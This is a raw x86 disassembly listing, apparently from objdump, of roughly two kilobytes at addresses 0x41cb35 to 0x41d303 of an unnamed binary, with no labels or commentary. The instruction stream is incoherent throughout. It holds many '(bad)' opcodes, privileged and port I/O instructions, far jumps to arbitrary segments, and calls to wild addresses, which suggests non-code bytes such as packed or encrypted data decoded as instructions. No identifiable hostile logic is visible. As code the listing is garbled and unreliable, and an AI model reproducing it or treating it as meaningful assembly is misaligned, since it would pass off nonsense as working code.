  41cb35:	mov    bh,0xf8
  41cb37:	iret   
  41cb38:	mov    bl,0xf1
  41cb3a:	(bad)  
  41cb3c:	fdivp  st(1),st
  41cb3e:	aad    0xe6
  41cb40:	(bad)  
  41cb41:	(bad)  
  41cb43:	ret    0xdfe9
  41cb46:	jecxz  0x41cb0c
  41cb48:	clc    
  41cb49:	add    esp,ebx
  41cb4b:	call   0xcb198c0e
  41cb50:	ret    
  41cb51:	test   dh,0xed
  41cb54:	rcl    bl,cl
  41cb56:	lods   eax,DWORD PTR ds:[esi]
  41cb57:	mov    edx,0xddd3fed9
  41cb5c:	rcr    eax,0xbc
  41cb5f:	out    0xf2,eax
  41cb61:	fpatan 
  41cb63:	ror    bl,1
  41cb65:	dec    DWORD PTR [ecx]
  41cb67:	std    
  41cb68:	mov    BYTE PTR ds:0xb1b8ff0b,0xd3
  41cb6f:	into   
  41cb70:	ror    cl,0xd7
  41cb73:	int    0xdb
  41cb75:	lock jmp 0x41cb76
  41cb78:	retf   
  41cb79:	out    dx,al
  41cb7a:	cmc    
  41cb7b:	clc    
  41cb7c:	rol    eax,1
  41cb7e:	out    dx,al
  41cb7f:	shl    edx,1
  41cb81:	fld    DWORD PTR [ecx+eiz*8]
  41cb84:	pop    es
  41cb85:	cmc    
  41cb86:	enter  0xeae2,0xd
  41cb8a:	loop   0x41cb95
  41cb8c:	fnsave [eax-0x3d31360f]
  41cb92:	rcr    ecx,1
  41cb94:	icebp  
  41cb95:	lds    edi,FWORD PTR [ecx-0x1002e32]
  41cb9b:	cli    
  41cb9c:	repnz xlat BYTE PTR ds:[ebx]
  41cb9e:	add    esi,eax
  41cba0:	mov    ebx,0xddf905db
  41cba5:	fmulp  st(3),st
  41cba7:	add    BYTE PTR [esi],al
  41cba9:	out    dx,eax
  41cbaa:	les    eax,FWORD PTR [edi]
  41cbac:	shr    ebx,1
  41cbae:	leave  
  41cbaf:	jmp    0xffea:0xf4e8c2bd
  41cbb6:	int3   
  41cbb7:	fcmovbe st,st(6)
  41cbb9:	hlt    
  41cbba:	sti    
  41cbbb:	stc    
  41cbbc:	aad    0xdf
  41cbbe:	ret    0x3e2
  41cbc1:	fsub   st,st(0)
  41cbc3:	push   es
  41cbc4:	or     ebx,ecx
  41cbc6:	cli    
  41cbc7:	add    esp,edx
  41cbc9:	jmp    0xe40eb9dc
  41cbce:	(bad)  
  41cbcf:	mov    esp,0xedc6f4e4
  41cbd4:	mov    cl,0xae
  41cbd6:	mov    edx,0xbcd7cfe4
  41cbdb:	mov    esp,0xd901ffb9
  41cbe0:	(bad)
  41cbe3:	shl    dh,0xe4
  41cbe6:	sar    DWORD PTR [esi+ebx*8-0x3d3f3b35],0xcd
  41cbee:	enter  0xc0ce,0xeb
  41cbf2:	retf   0xd1b7
  41cbf5:	cli    
  41cbf6:	shr    ah,cl
  41cbf8:	hlt    
  41cbf9:	jecxz  0x41cbaf
  41cbfb:	add    ebx,esi
  41cbfd:	fidivr WORD PTR [esi-0x9270a30]
  41cc03:	add    ecx,esp
  41cc05:	(bad)  
  41cc06:	out    0xe3,al
  41cc08:	into   
  41cc09:	loop   0x41cbd6
  41cc0b:	jmp    esi
  41cc0d:	into   
  41cc0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc0f:	mov    dh,0xc3
  41cc11:	lock hlt 
  41cc13:	mov    dh,0xd9
  41cc15:	jmp    0xc8b4:0xecbaefe8
  41cc1c:	into   
  41cc1d:	loope  0x41cbf5
  41cc1f:	rcr    edx,1
  41cc21:	std    
  41cc22:	mov    esp,0xd8f4f4d5
  41cc27:	(bad)  
  41cc28:	in     eax,0xff
  41cc2a:	add    DWORD PTR [edi],ecx
  41cc2c:	fldcw  WORD PTR [edi-0x1c335754]
  41cc32:	mov    bh,0xed
  41cc34:	aam    0xdb
  41cc36:	(bad)  
  41cc37:	mov    al,0xf2
  41cc39:	sti    
  41cc3a:	mov    esi,0xf1fdfcd7
  41cc3f:	std    
  41cc40:	rol    BYTE PTR [eax],cl
  41cc42:	loope  0x41cc20
  41cc44:	xlat   BYTE PTR ds:[ebx]
  41cc45:	add    eax,0xadddddf
  41cc4a:	loop   0x41cc46
  41cc4c:	retf   0xe5cb
  41cc4f:	mov    esp,0xb2edc2b3
  41cc54:	out    dx,eax
  41cc55:	repnz lock repz (bad) 
  41cc59:	mov    dh,0xcd
  41cc5b:	mov    al,0xf4
  41cc5d:	jecxz  0x41cc2b
  41cc5f:	jecxz  0x41cc28
  41cc61:	(bad)  
  41cc63:	aam    0xc2
  41cc65:	retf   0xfe0b
  41cc68:	out    dx,al
  41cc69:	in     al,0x0
  41cc6b:	rol    edi,cl
  41cc6d:	fdiv   DWORD PTR [ebx-0x313c0e38]
  41cc73:	loope  0x41cc6a
  41cc75:	retf   
  41cc76:	fnstcw WORD PTR [edx+0x3d8d3d0]
  41cc7c:	iret   
  41cc7d:	repz (bad) 
  41cc7f:	fcos   
  41cc81:	add    eax,0xd401fccb
  41cc86:	leave  
  41cc87:	jmp    0xbdea:0x12f9f80f
  41cc8e:	(bad)  
  41cc8f:	mov    dh,0xe2
  41cc91:	mov    al,0xcd
  41cc93:	(bad)  
  41cc94:	out    0xf5,al
  41cc96:	leave  
  41cc97:	mov    dh,0xeb
  41cc99:	jmp    0x41cc8b
  41cc9b:	leave  
  41cc9c:	enter  0xec00,0xd2
  41cca0:	(bad)  
  41cca2:	lock cmc 
  41cca4:	stc    
  41cca5:	retf   0xde2
  41cca8:	sti    
  41cca9:	out    0xb,eax
  41ccab:	or     cl,dh
  41ccad:	fild   QWORD PTR [eax-0x8133f0a]
  41ccb3:	lock mov cl,0xc5
  41ccb6:	in     eax,dx
  41ccb7:	cmc    
  41ccb8:	out    dx,al
  41ccb9:	fdivr  DWORD PTR [esi-0x92f3c18]
  41ccbf:	loop   0x41cc80
  41ccc1:	cld    
  41ccc2:	loopne 0x41ccb6
  41ccc4:	or     ebx,esp
  41ccc6:	retf   0xddf9
  41ccc9:	fstp   st(4)
  41cccb:	(bad)  
  41cccc:	mov    esp,0xcac7dfe8
  41ccd1:	mov    dh,0xc0
  41ccd3:	test   ebx,0xebbaffd8
  41ccd9:	ror    cl,1
  41ccdb:	test   edi,0xbbf8f5f0
  41cce1:	loop   0x41ccb6
  41cce3:	fadd   QWORD PTR [esi]
  41cce5:	jecxz  0x41ccc7
  41cce7:	mov    esp,0xccd30ade
  41ccec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cced:	in     eax,0xca
  41ccef:	repnz out 0xaa,al
  41ccf2:	lods   al,BYTE PTR ds:[esi]
  41ccf3:	xlat   BYTE PTR ds:[ebx]
  41ccf4:	shl    dl,1
  41ccf6:	jmp    0xd8fcb5d0
  41ccfb:	sti    
  41ccfc:	xlat   BYTE PTR ds:[ebx]
  41ccfd:	mov    eax,0xccfedad5
  41cd02:	shl    edi,0xfd
  41cd05:	shr    dh,0xc8
  41cd08:	add    eax,DWORD PTR [eax]
  41cd0a:	out    0xe7,eax
  41cd0c:	in     eax,dx
  41cd0d:	out    dx,eax
  41cd0e:	lods   al,BYTE PTR ds:[esi]
  41cd0f:	lock (bad) 
  41cd11:	int3   
  41cd12:	mov    ch,0xd5
  41cd14:	shl    ebp,cl
  41cd16:	aad    0xac
  41cd18:	retf   0xd0d6
  41cd1b:	fdivr  QWORD PTR [edi+0x402daf6]
  41cd21:	loope  0x41ccf6
  41cd23:	icebp  
  41cd24:	in     al,0x0
  41cd26:	test   BYTE PTR [ebx],0x5
  41cd29:	into   
  41cd2a:	adc    eax,DWORD PTR [edx]
  41cd2c:	in     al,dx
  41cd2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd2e:	fucom  st(5)
  41cd30:	scas   al,BYTE PTR es:[edi]
  41cd31:	repnz mov ebx,0xc8f5cad4
  41cd37:	mov    esi,0xffb4d7bf
  41cd3c:	aam    0xf5
  41cd3e:	loop   0x41cd1f
  41cd40:	test   DWORD PTR [ebx],0xc7e2fae5
  41cd46:	(bad)  
  41cd48:	leave  
  41cd49:	loopne 0x41cd2d
  41cd4b:	or     al,al
  41cd4d:	in     eax,dx
  41cd4e:	mov    esp,0xc8c6ace4
  41cd53:	retf   
  41cd54:	in     eax,0xc9
  41cd56:	shl    esi,1
  41cd58:	jmp    0x41cd50
  41cd5a:	clc    
  41cd5b:	mov    eax,0xe0f0bfc3
  41cd60:	inc    DWORD PTR [esi]
  41cd62:	mov    ecx,0x5d5e2e3
  41cd67:	(bad)  
  41cd69:	aam    0xd8
  41cd6b:	jmp    0x41cd17
  41cd6d:	imul   DWORD PTR [eax-0x4d3a0a2e]
  41cd73:	retf   
  41cd74:	iret   
  41cd75:	mov    eax,0xc8d7d7d4
  41cd7a:	out    dx,al
  41cd7b:	add    bl,ch
  41cd7d:	loopne 0x41cd40
  41cd7f:	into   
  41cd80:	jmp    esp
  41cd82:	lock in al,0xf6
  41cd85:	enter  0xc508,0xfe
  41cd89:	(bad)  
  41cd8a:	fcmovbe st,st(2)
  41cd8c:	mov    ecx,0xecd3dde2
  41cd91:	jecxz  0x41cd85
  41cd93:	in     eax,0xe1
  41cd95:	ror    dl,0xbe
  41cd98:	cld    
  41cd99:	(bad)  
  41cd9b:	mov    eax,0xb4beb6b9
  41cda0:	fiadd  DWORD PTR [edi]
  41cda2:	mov    ecx,0xdf0606d8
  41cda7:	aam    0xce
  41cda9:	jmp    0xeb2dd091
  41cdae:	int3   
  41cdaf:	scas   al,BYTE PTR es:[edi]
  41cdb0:	in     eax,dx
  41cdb1:	mov    dl,0xd2
  41cdb3:	out    0xce,eax
  41cdb5:	hlt    
  41cdb6:	lock clc 
  41cdb8:	into   
  41cdb9:	(bad)  
  41cdba:	mov    esp,0xe0dbced2
  41cdbf:	lock in al,0xb
  41cdc2:	sti    
  41cdc3:	loop   0x41cdbb
  41cdc5:	cli    
  41cdc6:	jmp    0xfd0bcbcc
  41cdcb:	or     bh,BYTE PTR [edi-0x3b08301e]
  41cdd1:	lods   eax,DWORD PTR ds:[esi]
  41cdd2:	ror    ebx,1
  41cdd4:	loope  0x41cda1
  41cdd6:	call   0xcf41cacd
  41cddb:	frndint 
  41cddd:	shr    dh,0xdf
  41cde0:	ffree  st(4)
  41cde2:	mov    ecx,0x4d005e7
  41cde7:	(bad)  [eax]
  41cde9:	iret   
  41cdea:	sti    
  41cdeb:	(bad)  [ecx-0x50394e3a]
  41cdf1:	test   esp,0xb7cfe6d0
  41cdf7:	mov    ch,0xcc
  41cdf9:	retf   0xced5
  41cdfc:	mov    esi,0xd1c0e7e3
  41ce01:	inc    BYTE PTR [ecx]
  41ce03:	or     edx,esp
  41ce05:	loop   0x41cdf1
  41ce07:	out    dx,al
  41ce08:	or     al,0xe9
  41ce0a:	or     ecx,edx
  41ce0c:	mov    dl,0xf7
  41ce0e:	icebp  
  41ce0f:	scas   eax,DWORD PTR es:[edi]
  41ce10:	mov    edx,0xe8c5e4b5
  41ce16:	in     eax,dx
  41ce17:	jmp    0x41cde4
  41ce19:	int3   
  41ce1a:	repnz enter 0xd9d9,0x1
  41ce1f:	(bad)  
  41ce21:	push   es
  41ce22:	jmp    0x41ce00
  41ce24:	fld    st(0)
  41ce26:	out    dx,eax
  41ce27:	loopne 0x41ce0f
  41ce29:	(bad)  
  41ce2b:	fisubr WORD PTR [esi+eiz*8-0x12102153]
  41ce32:	enter  0xb7f7,0xc4
  41ce36:	in     eax,0xfe
  41ce38:	cli    
  41ce39:	mov    esp,0xd9f9d2dd
  41ce3e:	rcr    cl,1
  41ce40:	loope  0x41ce3d
  41ce42:	hlt    
  41ce43:	or     esi,esp
  41ce45:	clc    
  41ce46:	ror    BYTE PTR [esi],0xd
  41ce49:	inc    ah
  41ce4b:	fdivr  st(0),st
  41ce4d:	leave  
  41ce4e:	shr    DWORD PTR [ebp-0x2f3f0813],cl
  41ce54:	out    dx,eax
  41ce55:	mov    dl,0xec
  41ce57:	in     al,dx
  41ce58:	retf   0xd8b5
  41ce5b:	cmc    
  41ce5c:	add    ah,al
  41ce5e:	mov    ebp,0x30301c3
  41ce63:	jecxz  0x41ce3c
  41ce65:	std    
  41ce66:	fisttp QWORD PTR [eax]
  41ce68:	or     ebp,eax
  41ce6a:	fcom   QWORD PTR [ebx]
  41ce6c:	mov    eax,0xd4acf3b8
  41ce71:	call   0xd7f7894c
  41ce76:	in     eax,dx
  41ce77:	fidivr DWORD PTR [esi-0x2f0b0f]
  41ce7d:	loop   0x41ce75
  41ce7f:	repz add ebp,esp
  41ce82:	add    BYTE PTR [ebx],al
  41ce84:	xlat   BYTE PTR ds:[ebx]
  41ce85:	cli    
  41ce86:	mov    ebp,0xcbd9e009
  41ce8b:	push   es
  41ce8c:	shl    ecx,1
  41ce8e:	in     al,0xf7
  41ce90:	ror    cl,0xd0
  41ce93:	rcr    ecx,1
  41ce95:	int3   
  41ce96:	aam    0xf2
  41ce98:	sar    ebp,1
  41ce9a:	std    
  41ce9b:	jmp    0xd303be90
  41cea0:	rol    BYTE PTR [edx],cl
  41cea2:	(bad)  
  41cea4:	push   es
  41cea5:	lock mov ebp,0xdef805e7
  41ceab:	leave  
  41ceac:	lods   al,BYTE PTR ds:[esi]
  41cead:	xlat   BYTE PTR ds:[ebx]
  41ceae:	out    dx,eax
  41ceaf:	mov    al,0xb1
  41ceb1:	(bad)
  41ceb4:	(bad)  
  41ceb5:	(bad)  
  41ceb7:	in     al,dx
  41ceb8:	(bad)  
  41ceba:	mov    cl,0xd7
  41cebc:	std    
  41cebd:	(bad)  
  41cebe:	(bad)  
  41cec0:	(bad)  
  41cec2:	fmul   st,st(2)
  41cec4:	in     eax,0x0
  41cec6:	out    dx,eax
  41cec7:	fcmovnbe st,st(5)
  41cec9:	stc    
  41ceca:	(bad)  
  41cecc:	retf   0xf3f2
  41cecf:	test   bl,0xc7
  41ced2:	jmp    0xe91bbea1
  41ced7:	(bad)  
  41ced8:	(bad)  
  41ced9:	(bad)  
  41ceda:	div    ecx
  41cedc:	shl    ebp,1
  41cede:	loope  0x41ceba
  41cee0:	cli    
  41cee1:	sti    
  41cee2:	idiv   ch
  41cee4:	imul   ecx
  41cee6:	call   0xcd48acf1
  41ceeb:	or     ebp,DWORD PTR [ecx-0x323e3b2e]
  41cef1:	(bad)  
  41cef2:	jmp    0x41ceca
  41cef4:	mov    ecx,0xb8ebd8e0
  41cef9:	clc    
  41cefa:	retf   
  41cefb:	loope  0x41ceea
  41cefd:	lock fcom st(6)
  41cf00:	in     al,dx
  41cf01:	jecxz  0x41cefc
  41cf03:	lock inc ch
  41cf06:	cld    
  41cf07:	fucom  st(7)
  41cf09:	or     eax,0xadd303ff
  41cf0e:	shr    edx,1
  41cf10:	icebp  
  41cf11:	mov    bl,0xea
  41cf13:	(bad)  
  41cf14:	repz retf 0xc4ce
  41cf18:	icebp  
  41cf19:	repnz mov edx,0xfbdcfdf2
  41cf1f:	int3   
  41cf20:	fdiv   st,st(4)
  41cf22:	(bad)  
  41cf23:	shl    ebp,1
  41cf25:	jmp    0x1e0:0xcee5ff09
  41cf2c:	mov    bl,0xce
  41cf2e:	repnz out dx,eax
  41cf30:	stos   DWORD PTR es:[edi],eax
  41cf31:	les    edi,FWORD PTR [ebx-0x30105058]
  41cf37:	lods   al,BYTE PTR ds:[esi]
  41cf38:	out    dx,al
  41cf39:	fstp   st(2)
  41cf3b:	loop   0x41cf2d
  41cf3d:	repz cmc 
  41cf3f:	out    0x1,eax
  41cf41:	mov    esp,0x5f70ac5
  41cf46:	add    edi,ecx
  41cf48:	add    DWORD PTR [esi],ecx
  41cf4a:	repnz iret 
  41cf4c:	jmp    0x41cf3b
  41cf4e:	icebp  
  41cf4f:	fucomp st(7)
  41cf51:	shr    BYTE PTR [ecx-0xe442f2b],0xd0
  41cf58:	mov    ebp,0xdbd2d6e9
  41cf5d:	in     eax,dx
  41cf5e:	sti    
  41cf5f:	xlat   BYTE PTR ds:[ebx]
  41cf60:	repz rol eax,cl
  41cf63:	(bad)  
  41cf64:	out    0xf4,al
  41cf66:	out    0xb,eax
  41cf68:	loop   0x41cf54
  41cf6a:	dec    dl
  41cf6c:	call   0xed059b58
  41cf71:	mov    ch,0xad
  41cf73:	(bad)  
  41cf74:	cli    
  41cf75:	in     al,dx
  41cf76:	call   0xfcfe9f74
  41cf7b:	(bad)  
  41cf7d:	fucom  st(2)
  41cf7f:	xlat   BYTE PTR ds:[ebx]
  41cf80:	(bad)  
  41cf81:	(bad)  
  41cf82:	in     al,0xbc
  41cf84:	(bad)  
  41cf85:	fld    QWORD PTR [ecx]
  41cf87:	fcom   st(5)
  41cf89:	in     al,0x5
  41cf8b:	in     al,0xce
  41cf8d:	into   
  41cf8e:	shl    ebx,cl
  41cf90:	les    ebp,FWORD PTR [ebx+esi*8-0xd27051a]
  41cf97:	mov    ah,0xbe
  41cf99:	repz hlt 
  41cf9b:	fistp  QWORD PTR [eax-0x1f194005]
  41cfa1:	in     eax,0xd6
  41cfa3:	mov    esp,0xfbc9d4e5
  41cfa8:	retf   0xb09
  41cfab:	in     al,0xbc
  41cfad:	leave  
  41cfae:	jmp    0xc9049863
  41cfb3:	out    0xb5,al
  41cfb5:	aam    0xce
  41cfb7:	mov    ah,0xd4
  41cfb9:	mov    ebx,0xdfb9f4cc
  41cfbe:	out    dx,al
  41cfbf:	in     eax,dx
  41cfc0:	hlt    
  41cfc1:	(bad)  
  41cfc2:	aam    0xd8
  41cfc4:	loop   0x41cf87
  41cfc6:	rcr    esp,0xe0
  41cfc9:	int    0x1
  41cfcb:	fld    st(4)
  41cfcd:	out    dx,eax
  41cfce:	retf   
  41cfcf:	mov    esp,0xc8b6aab0
  41cfd4:	fcom   st(0)
  41cfd6:	stc    
  41cfd7:	repnz in al,dx
  41cfd9:	retf   
  41cfda:	cld    
  41cfdb:	ret    
  41cfdc:	clc    
  41cfdd:	pop    es
  41cfde:	in     al,dx
  41cfdf:	pop    es
  41cfe0:	aam    0x1
  41cfe2:	in     eax,0xc2
  41cfe4:	add    al,BYTE PTR [esi]
  41cfe6:	(bad)  
  41cfe8:	in     al,dx
  41cfe9:	enter  0xcbed,0xef
  41cfed:	fmul   st,st(1)
  41cfef:	shl    BYTE PTR [ecx-0x482d3012],1
  41cff5:	imul   esi
  41cff7:	imul   dl
  41cff9:	mov    esp,0xecddd2b4
  41cffe:	ret    0xd2db
  41d001:	lock not ch
  41d004:	out    0xf9,eax
  41d006:	enter  0xc4cb,0xc8
  41d00a:	ficom  DWORD PTR [ecx]
  41d00c:	fadd   st,st(4)
  41d00e:	retf   
  41d00f:	scas   al,BYTE PTR es:[edi]
  41d010:	in     eax,0xd2
  41d012:	mov    dh,0xd5
  41d014:	rol    eax,0xf2
  41d017:	call   0xf5169a0f
  41d01c:	lock shr dh,1
  41d01f:	jecxz  0x41cffb
  41d021:	sar    BYTE PTR [ecx+0x2dd0bdc],cl
  41d027:	or     ah,al
  41d029:	jmp    0xeaf2:0xb3e1e6f2
  41d030:	mov    dh,0xd2
  41d032:	jmp    0xf70db20b
  41d037:	mov    ecx,0xe9f8e3d3
  41d03c:	shl    edi,1
  41d03e:	imul   ch
  41d040:	(bad)  
  41d041:	rol    BYTE PTR [edx+ebx*8],cl
  41d044:	pop    es
  41d045:	(bad)  
  41d046:	fsubp  st(3),st
  41d048:	add    al,BYTE PTR ds:0xc1a7d913
  41d04e:	loopne 0x41d017
  41d050:	out    0xca,al
  41d052:	out    dx,al
  41d053:	into   
  41d054:	aam    0xeb
  41d056:	ror    dl,cl
  41d058:	(bad)  
  41d059:	cmc    
  41d05a:	cli    
  41d05b:	fldz   
  41d05d:	in     eax,dx
  41d05e:	icebp  
  41d05f:	out    dx,al
  41d060:	repz out 0xa,eax
  41d063:	retf   
  41d064:	out    0x7,al
  41d066:	pop    es
  41d067:	jecxz  0x41d068
  41d069:	add    cl,al
  41d06b:	or     eax,0xccdea6af
  41d070:	mov    bh,0xcf
  41d072:	in     al,dx
  41d073:	fld1   
  41d075:	hlt    
  41d076:	leave  
  41d077:	cmc    
  41d078:	enter  0xe2b8,0xde
  41d07c:	add    edi,eax
  41d07e:	loope  0x41d042
  41d080:	rcr    esi,0xcb
  41d083:	rcr    ch,1
  41d085:	xlat   BYTE PTR ds:[ebx]
  41d086:	add    ebp,eax
  41d088:	or     al,0xfe
  41d08a:	(bad)  
  41d08c:	faddp  st(1),st
  41d08e:	rcl    edi,0xcd
  41d091:	ret    
  41d092:	(bad)  
  41d093:	out    dx,eax
  41d094:	clc    
  41d095:	out    dx,eax
  41d096:	iret   
  41d097:	div    dl
  41d099:	xlat   BYTE PTR ds:[ebx]
  41d09a:	repz cmc 
  41d09c:	not    al
  41d09e:	ret    
  41d09f:	mov    esp,0xcbdde6c1
  41d0a4:	std    
  41d0a5:	jecxz  0x41d07f
  41d0a7:	mov    esp,0xb05c205
  41d0ac:	fdivrp st(3),st
  41d0ae:	(bad)
  41d0b1:	lds    esi,FWORD PTR [edx-0x1600322a]
  41d0b7:	jmp    0xd4f4:0xd9d2d8d3
  41d0be:	int    0xf9
  41d0c0:	std    
  41d0c1:	in     al,0xd3
  41d0c3:	loopne 0x41d0ad
  41d0c5:	jecxz  0x41d0ad
  41d0c7:	jmp    0x41d0cc
  41d0c9:	or     al,0xd8
  41d0cb:	jmp    0x41d0af
  41d0cd:	lods   eax,DWORD PTR ds:[esi]
  41d0ce:	in     eax,0xc2
  41d0d0:	shl    DWORD PTR [ebp-0x3913134a],0xda
  41d0d7:	(bad)  
  41d0d8:	mov    ebx,0xedbcffed
  41d0dd:	rol    ecx,1
  41d0df:	rol    al,1
  41d0e1:	hlt    
  41d0e2:	cli    
  41d0e3:	add    al,0x4
  41d0e5:	(bad)  
  41d0e6:	fstp   st(2)
  41d0e8:	or     edi,ecx
  41d0ea:	in     al,dx
  41d0eb:	pop    es
  41d0ec:	mov    ecx,0xcdd0ccc8
  41d0f1:	into   
  41d0f2:	in     al,dx
  41d0f3:	ret    0xb7d6
  41d0f6:	div    ah
  41d0f8:	mov    eax,0xc1fbfdf7
  41d0fd:	ret    
  41d0fe:	(bad)  
  41d0ff:	mov    eax,0xd9f7c6f4
  41d104:	add    edx,eax
  41d106:	leave  
  41d107:	(bad)  
  41d109:	or     eax,DWORD PTR [ebx]
  41d10b:	repz mov eax,0xe6c6dde2
  41d111:	xlat   BYTE PTR ds:[ebx]
  41d112:	call   0xf333a3db
  41d117:	int    0xd3
  41d119:	(bad)  
  41d11a:	mul    cl
  41d11c:	cli    
  41d11d:	iret   
  41d11e:	add    esi,edi
  41d120:	(bad)  
  41d121:	loopne 0x41d0df
  41d123:	mov    esp,0xfddffc09
  41d128:	clc    
  41d129:	in     al,0xe
  41d12b:	in     eax,0xec
  41d12d:	repz mov edi,0xb3bcc0f7
  41d133:	rcr    eax,0xbb
  41d136:	fdivrp st(3),st
  41d138:	mov    dh,0xdc
  41d13a:	hlt    
  41d13b:	leave  
  41d13c:	add    BYTE PTR [edi],al
  41d13e:	add    esp,edi
  41d140:	push   es
  41d141:	rcl    esi,0xf9
  41d144:	fld    st(2)
  41d146:	or     ebx,edi
  41d148:	(bad)  
  41d14a:	(bad)  
  41d14b:	fsubr  DWORD PTR [ebx+ebp*8-0x28161c3e]
  41d152:	(bad)  
  41d153:	out    0xee,al
  41d155:	rcr    edi,cl
  41d157:	jmp    0xd9f7:0xd4b1b6ce
  41d15e:	hlt    
  41d15f:	stc    
  41d160:	push   es
  41d161:	loop   0x41d153
  41d163:	add    eax,0xe5cbeae6
  41d168:	out    dx,eax
  41d169:	or     al,0xc5
  41d16b:	leave  
  41d16c:	in     al,dx
  41d16d:	repz in al,0xe5
  41d170:	mov    ch,0xea
  41d172:	int3   
  41d173:	mov    dh,0xcb
  41d175:	out    dx,al
  41d176:	(bad)  
  41d177:	sar    DWORD PTR [esi-0x11002925],1
  41d17d:	in     al,dx
  41d17e:	(bad)  
  41d17f:	loope  0x41d162
  41d181:	out    0xb9,eax
  41d183:	add    bl,dl
  41d185:	clc    
  41d186:	jmp    0xfe43d453
  41d18b:	fisubr DWORD PTR [ebx+edx*8-0x3a100e29]
  41d192:	mov    al,0xd6
  41d194:	int3   
  41d195:	(bad)  
  41d196:	fdivp  st(3),st
  41d198:	in     eax,0xbc
  41d19a:	aam    0xd4
  41d19c:	out    dx,eax
  41d19d:	add    ah,al
  41d19f:	fcmovnb st,st(0)
  41d1a1:	cld    
  41d1a2:	in     al,0xe9
  41d1a4:	pop    es
  41d1a5:	leave  
  41d1a6:	iret   
  41d1a7:	loope  0x41d198
  41d1a9:	leave  
  41d1aa:	add    eax,DWORD PTR [edi]
  41d1ac:	int    0xa8
  41d1ae:	repnz mov esp,0xcce6fbdc
  41d1b4:	scas   eax,DWORD PTR es:[edi]
  41d1b5:	ror    al,cl
  41d1b7:	cli    
  41d1b8:	(bad)  
  41d1ba:	(bad)  
  41d1bc:	int    0xce
  41d1be:	fild   WORD PTR [ecx]
  41d1c0:	add    esp,esp
  41d1c2:	cmc    
  41d1c3:	(bad)  
  41d1c4:	shl    al,1
  41d1c6:	fsubr  st(4),st
  41d1c8:	out    dx,al
  41d1c9:	or     ecx,DWORD PTR ds:0xcdbeefcf
  41d1cf:	into   
  41d1d0:	out    0xf5,eax
  41d1d2:	rol    al,1
  41d1d4:	out    0xee,eax
  41d1d6:	jmp    0xb702:0xd8efd5d8
  41d1dd:	mov    esp,0xbaf3d2bd
  41d1e2:	retf   
  41d1e3:	loope  0x41d1c2
  41d1e5:	ror    cl,0xdc
  41d1e8:	into   
  41d1e9:	out    0x2,eax
  41d1eb:	loop   0x41d1a5
  41d1ed:	loope  0x41d1dd
  41d1ef:	int3   
  41d1f0:	hlt    
  41d1f1:	mov    dl,0xf5
  41d1f3:	(bad)  
  41d1f4:	clc    
  41d1f5:	call   0xd30b98d9
  41d1fa:	mov    ah,0xf0
  41d1fc:	cli    
  41d1fd:	out    0x1,eax
  41d1ff:	ffree  st(0)
  41d201:	out    0xda,eax
  41d203:	(bad)  
  41d205:	add    eax,0xfff50dda
  41d20a:	jmp    0x41d1f3
  41d20c:	fnstenv [ecx-0x114a5224]
  41d212:	mov    dh,0xba
  41d214:	out    0xcb,al
  41d216:	rcr    ecx,cl
  41d218:	out    dx,eax
  41d219:	(bad)  
  41d21b:	sti    
  41d21c:	loope  0x41d1e0
  41d21e:	lock in eax,0xff
  41d221:	mov    DWORD PTR [eax],0xd90b05fd
  41d227:	fmul   QWORD PTR [eax]
  41d229:	push   es
  41d22a:	jmp    0x41d206
  41d22c:	ffreep st(3)
  41d22e:	shr    edx,0xc8
  41d231:	mov    cl,0xef
  41d233:	sar    edx,0xda
  41d236:	int3   
  41d237:	out    0xde,al
  41d239:	fsub   st(6),st
  41d23b:	call   0xcf14cf34
  41d240:	fld    QWORD PTR [edi]
  41d242:	ret    
  41d243:	(bad)  
  41d244:	fcmovbe st,st(6)
  41d246:	(bad)  
  41d248:	out    dx,al
  41d249:	or     ecx,edx
  41d24b:	or     ecx,edx
  41d24d:	out    dx,al
  41d24e:	ror    eax,0xd3
  41d251:	fsubr  st(7),st
  41d253:	out    dx,eax
  41d254:	retf   0xbbb4
  41d257:	retf   
  41d258:	imul   edi
  41d25a:	mov    esp,0xfcd501c2
  41d25f:	in     eax,0xe5
  41d261:	(bad)  
  41d263:	(bad)  
  41d266:	call   0xe616cd6e
  41d26b:	loopne 0x41d254
  41d26d:	scas   eax,DWORD PTR es:[edi]
  41d26e:	scas   al,BYTE PTR es:[edi]
  41d26f:	in     al,0xd6
  41d271:	xlat   BYTE PTR ds:[ebx]
  41d272:	leave  
  41d273:	out    dx,eax
  41d274:	clc    
  41d275:	jmp    0xc8ce:0xb8baf6de
  41d27c:	(bad)  
  41d27e:	lock in eax,0xfb
  41d281:	jecxz  0x41d25d
  41d283:	jmp    0x41d249
  41d285:	shl    cl,0xe9
  41d288:	jecxz  0x41d267
  41d28a:	push   cs
  41d28b:	loop   0x41d24a
  41d28d:	iret   
  41d28e:	icebp  
  41d28f:	mov    cl,0xcd
  41d291:	cmc    
  41d292:	out    0xca,al
  41d294:	rcr    edx,cl
  41d296:	in     al,0xf8
  41d298:	shr    esp,cl
  41d29a:	into   
  41d29b:	mov    ecx,0xbdfbf6dc
  41d2a0:	inc    DWORD PTR [edi]
  41d2a2:	add    al,ah
  41d2a4:	sti    
  41d2a5:	loopne 0x41d29e
  41d2a7:	call   0xdd43be99
  41d2ac:	into   
  41d2ad:	xlat   BYTE PTR ds:[ebx]
  41d2ae:	scas   eax,DWORD PTR es:[edi]
  41d2af:	out    0xbc,al
  41d2b1:	repnz sar BYTE PTR [ebx-0x284b0416],cl
  41d2b8:	int    0xb5
  41d2ba:	loop   0x41d291
  41d2bc:	shl    esi,cl
  41d2be:	add    esp,edi
  41d2c0:	add    eax,0xe2d1da04
  41d2c5:	(bad)  
  41d2c6:	jmp    0xd847dab9
  41d2cb:	fidivr DWORD PTR [edx+ecx*8-0x134e2937]
  41d2d2:	rcl    esi,cl
  41d2d4:	imul   bl
  41d2d6:	sti    
  41d2d7:	(bad)  
  41d2d8:	div    DWORD PTR [esi-0x45312938]
  41d2de:	out    0xfe,al
  41d2e0:	mov    ebx,0xd5ebf2fc
  41d2e5:	add    cl,BYTE PTR [eax]
  41d2e7:	jmp    0xc7b3:0xc4fa0bfb
  41d2ee:	enter  0xe7b6,0xf6
  41d2f2:	mov    ah,0xd0
  41d2f4:	xlat   BYTE PTR ds:[ebx]
  41d2f5:	call   esp
  41d2f7:	mov    eax,0xe9dfd8f2
  41d2fc:	aad    0xd7
  41d2fe:	ret    
  41d2ff:	lock shl ecx,0x0
  41d303:	sar    ch,cl
